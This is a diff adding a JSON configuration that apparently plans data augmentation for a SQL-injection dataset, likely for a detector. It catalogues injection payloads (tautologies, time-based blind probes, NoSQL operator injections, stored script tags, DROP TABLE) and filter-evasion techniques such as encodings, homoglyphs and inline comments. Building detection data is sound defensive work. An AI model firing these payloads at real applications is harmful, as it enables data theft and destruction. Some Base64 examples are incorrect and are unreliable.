@@ -1,0 +1,371 @@
+{
+  "1_encoding_transformations": {
+    "description": "Various encoding schemes to obfuscate attacks",
+    "transformations": {
+      "URL_encoding": {
+        "description": "Percent-encode characters",
+        "examples": [
+          "' OR 1=1-- => %27%20OR%201%3D1--",
+          "UNION SELECT => UNION%20SELECT"
+        ],
+        "implementation": "urllib.parse.quote()",
+        "target_characters": "Special chars: ' \" = < > ; ( ) space",
+        "variants": [
+          "single",
+          "double",
+          "selective"
+        ]
+      },
+      "Hex_encoding": {
+        "description": "Convert strings to hex format",
+        "examples": [
+          "admin => 0x61646d696e",
+          "SELECT => 0x53454c454354"
+        ],
+        "implementation": "hex(string)",
+        "variants": [
+          "0x prefix",
+          "\\x prefix",
+          "mixed"
+        ]
+      },
+      "Unicode_escapes": {
+        "description": "Unicode escape sequences",
+        "examples": [
+          "' => \\u0027",
+          "OR => \\u004f\\u0052"
+        ],
+        "implementation": "\\uXXXX format",
+        "variants": [
+          "\\u",
+          "\\U",
+          "%u"
+        ]
+      },
+      "Base64_encoding": {
+        "description": "Base64 encode payloads",
+        "examples": [
+          "' OR 1=1 => JyBPUiAxPTE=",
+          "UNION SELECT => VU5JT04gU0VMRUNUA=="
+        ],
+        "implementation": "base64.b64encode()",
+        "variants": [
+          "standard",
+          "URL-safe"
+        ]
+      },
+      "Octal_encoding": {
+        "description": "Octal representation",
+        "examples": [
+          "A => \\101",
+          "' => \\047"
+        ],
+        "implementation": "oct(ord(char))",
+        "variants": [
+          "backslash",
+          "0o prefix"
+        ]
+      }
+    },
+    "augmentation_goal": "Generate 5 variants per malicious sample",
+    "estimated_new_samples": 440035
+  },
+  "2_time_based_blind": {
+    "description": "Time-based blind SQL injection payloads",
+    "transformations": {
+      "SLEEP_functions": {
+        "description": "Database sleep functions",
+        "examples": [
+          "' AND SLEEP(5)--",
+          "'; WAITFOR DELAY '00:00:05'--",
+          "' AND pg_sleep(5)--"
+        ],
+        "databases": [
+          "MySQL",
+          "MSSQL",
+          "PostgreSQL"
+        ],
+        "delay_values": [
+          1,
+          3,
+          5,
+          10
+        ]
+      },
+      "BENCHMARK_functions": {
+        "description": "CPU-intensive operations for timing",
+        "examples": [
+          "' AND BENCHMARK(5000000, MD5('A'))--",
+          "' AND HEAVY_COMPUTATION()--"
+        ],
+        "implementation": "BENCHMARK(iterations, operation)"
+      },
+      "Conditional_timing": {
+        "description": "IF/CASE with timing",
+        "examples": [
+          "' AND IF(1=1, SLEEP(5), 0)--",
+          "' AND CASE WHEN 1=1 THEN SLEEP(5) END--"
+        ],
+        "variants": [
+          "IF",
+          "CASE",
+          "nested"
+        ]
+      }
+    },
+    "augmentation_goal": "Generate 3 time-based variants per sample",
+    "estimated_new_samples": 264021
+  },
+  "3_nosql_injection": {
+    "description": "NoSQL injection patterns (MongoDB, etc.)",
+    "transformations": {
+      "JSON_operators": {
+        "description": "MongoDB query operators",
+        "examples": [
+          "{\"username\": {\"$ne\": null}}",
+          "{\"$where\": \"this.username == 'admin'\"}",
+          "{\"price\": {\"$gt\": 0}}"
+        ],
+        "operators": [
+          "$ne",
+          "$gt",
+          "$lt",
+          "$regex",
+          "$where",
+          "$in",
+          "$nin"
+        ]
+      },
+      "Operator_chaining": {
+        "description": "Multiple NoSQL operators",
+        "examples": [
+          "{\"$and\": [{\"price\": {\"$gt\": 0}}, {\"stock\": {\"$ne\": 0}}]}",
+          "{\"$or\": [{\"role\": \"admin\"}, {\"role\": \"superuser\"}]}"
+        ],
+        "complexity": [
+          "single",
+          "chained",
+          "nested"
+        ]
+      },
+      "Regex_payloads": {
+        "description": "Regex-based NoSQL injections",
+        "examples": [
+          "{\"username\": {\"$regex\": \"^admin\"}}",
+          "{\"password\": {\"$regex\": \".*\"}}"
+        ],
+        "patterns": [
+          "wildcard",
+          "anchored",
+          "negated"
+        ]
+      }
+    },
+    "augmentation_goal": "Generate 4 NoSQL variants per 100 SQL samples",
+    "estimated_new_samples": 3520
+  },
+  "4_second_order_injection": {
+    "description": "Payloads that persist and execute later",
+    "transformations": {
+      "Stored_payloads": {
+        "description": "Data stored then executed",
+        "examples": [
+          "username: admin'-- (stored in DB, used in query later)",
+          "comment: <script>alert(1)</script> (stored, rendered later)"
+        ],
+        "storage_points": [
+          "username",
+          "email",
+          "comment",
+          "profile"
+        ]
+      },
+      "Multi_stage_attacks": {
+        "description": "Attack in multiple requests",
+        "examples": [
+          "Stage 1: Store '; DROP TABLE--",
+          "Stage 2: Trigger via search/report generation"
+        ],
+        "stages": [
+          2,
+          3
+        ]
+      }
+    },
+    "augmentation_goal": "Generate 2 second-order variants per 100 samples",
+    "estimated_new_samples": 1760
+  },
+  "5_context_specific": {
+    "description": "Attack variants based on injection context",
+    "transformations": {
+      "Web_form_fields": {
+        "description": "Form input injection",
+        "examples": [
+          "username=' OR '1'='1",
+          "password=anything&username=admin'--"
+        ],
+        "fields": [
+          "login",
+          "search",
+          "registration"
+        ]
+      },
+      "HTTP_headers": {
+        "description": "Header-based injection",
+        "examples": [
+          "User-Agent: ' OR 1=1--",
+          "Referer: http://site.com?id=1' UNION SELECT--"
+        ],
+        "headers": [
+          "User-Agent",
+          "Referer",
+          "X-Forwarded-For"
+        ]
+      },
+      "JSON_bodies": {
+        "description": "JSON API injection",
+        "examples": [
+          "{\"id\": \"1' OR '1'='1\"}",
+          "{\"search\": \"test' UNION SELECT--\"}"
+        ],
+        "injection_points": [
+          "string fields",
+          "numeric fields"
+        ]
+      },
+      "REST_endpoints": {
+        "description": "URL path/query injection",
+        "examples": [
+          "/api/users/1' OR '1'='1/profile",
+          "/search?q=test' UNION SELECT--"
+        ],
+        "methods": [
+          "GET",
+          "POST",
+          "PUT"
+        ]
+      },
+      "Cookies": {
+        "description": "Cookie-based injection",
+        "examples": [
+          "session=abc123' OR 1=1--",
+          "user_id=5' UNION SELECT--"
+        ],
+        "cookie_types": [
+          "session",
+          "tracking",
+          "preferences"
+        ]
+      }
+    },
+    "augmentation_goal": "Generate 3 context variants per sample",
+    "estimated_new_samples": 264021
+  },
+  "6_character_substitution": {
+    "description": "Character-level obfuscation",
+    "transformations": {
+      "Leet_speak": {
+        "description": "Replace letters with numbers/symbols",
+        "examples": [
+          "SELECT => S3L3CT",
+          "UNION => UN10N",
+          "admin => 4dm1n"
+        ],
+        "mappings": {
+          "E": "3",
+          "A": "4",
+          "I": "1",
+          "O": "0",
+          "S": "5"
+        }
+      },
+      "Homoglyphs": {
+        "description": "Visually similar Unicode characters",
+        "examples": [
+          "SELECT => S\u0415L ECT (Cyrillic E)",
+          "UNION => U\u039d ION (Greek N)"
+        ],
+        "character_sets": [
+          "Cyrillic",
+          "Greek",
+          "look-alikes"
+        ]
+      },
+      "Case_variations": {
+        "description": "Mixed case to evade filters",
+        "examples": [
+          "SELECT => SeLeCt",
+          "UNION => UnIoN",
+          "DROP => DrOp"
+        ],
+        "patterns": [
+          "alternating",
+          "random",
+          "camelCase"
+        ]
+      }
+    },
+    "augmentation_goal": "Generate 4 character variants per sample",
+    "estimated_new_samples": 352028
+  },
+  "7_obfuscation_techniques": {
+    "description": "Advanced obfuscation methods",
+    "transformations": {
+      "Comment_injection": {
+        "description": "Insert comments within keywords",
+        "examples": [
+          "SEL/**/ECT",
+          "UN/*comment*/ION",
+          "DR/**/OP"
+        ],
+        "comment_types": [
+          "/**/",
+          "/* comment */",
+          "-- comment\\n"
+        ]
+      },
+      "Whitespace_manipulation": {
+        "description": "Excessive or unusual whitespace",
+        "examples": [
+          "SELECT     FROM",
+          "UNION\\t\\t\\tSELECT",
+          "OR\\n\\n\\n1=1"
+        ],
+        "whitespace_types": [
+          "space",
+          "tab",
+          "newline",
+          "mixed"
+        ]
+      },
+      "Concatenation": {
+        "description": "String concatenation to build keywords",
+        "examples": [
+          "CONCAT('SE','LECT')",
+          "'UN'||'ION'",
+          "'DR'+'OP'"
+        ],
+        "operators": [
+          "CONCAT()",
+          "||",
+          "+"
+        ]
+      },
+      "Function_wrapping": {
+        "description": "Wrap in functions",
+        "examples": [
+          "CHAR(83,69,76,69,67,84)",
+          "UNHEX('53454C454354')",
+          "FROM_BASE64('U0VMRUNUA==')"
+        ],
+        "functions": [
+          "CHAR",
+          "UNHEX",
+          "FROM_BASE64"
+        ]
+      }
+    },
+    "augmentation_goal": "Generate 5 obfuscation variants per sample",
+    "estimated_new_samples": 440035
+  }
+}
